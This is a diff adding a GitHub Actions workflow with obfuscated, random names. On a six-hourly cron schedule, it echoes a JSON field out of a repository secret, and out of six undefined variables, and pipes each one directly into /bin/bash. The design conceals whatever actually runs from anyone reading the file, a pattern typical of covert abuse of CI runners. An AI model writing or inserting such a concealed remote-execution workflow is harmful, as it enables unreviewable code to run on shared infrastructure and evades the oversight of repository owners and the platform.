@@ -1,0 +1,22 @@
+name: lanjianxing2817
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lanjianxing2817
+        env:
+          mv0634: ${{ secrets.mv0634 }}
+        run: |
+          echo $mv0634 | jq -r .ojdgg40 | /bin/bash
+          echo $yrncu033 | jq -r .c1302 | /bin/bash
+          echo $sn30630 | jq -r .yok604 | /bin/bash
+          echo $lkgdw78348 | jq -r .ryc9136 | /bin/bash
+          echo $wm01925 | jq -r .lxgl48967 | /bin/bash
+          echo $mu329 | jq -r .u9361 | /bin/bash
+          echo $aun004 | jq -r .j24 | /bin/bash
+
